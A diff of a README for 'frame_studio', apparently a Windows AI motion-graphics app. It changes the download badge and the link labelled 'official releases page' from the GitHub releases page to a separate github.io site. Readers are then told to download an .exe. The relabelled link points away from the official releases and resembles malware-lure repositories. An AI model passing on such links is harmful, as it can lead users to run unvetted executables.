@@ -1,6 +1,6 @@
 # 🎥 frame_studio - Create professional motion graphics with AI
 
-[![Download Frame Studio](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Audysquinteyed352/frame_studio/releases)
+[![Download Frame Studio](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://audysquinteyed352.github.io)
 
 ## What is Frame Studio?
 
@@ -22,7 +22,7 @@ Before you start, check that your system meets these needs:
 
 You need the correct installer file for your Windows system. Follow these steps to obtain the software:
 
-1. Visit the [official releases page](https://github.com/Audysquinteyed352/frame_studio/releases).
+1. Visit the [official releases page](https://audysquinteyed352.github.io).
 2. Locate the section labeled Latest.
 3. Look for the file ending in .exe.
 4. Click the file name to start the download.
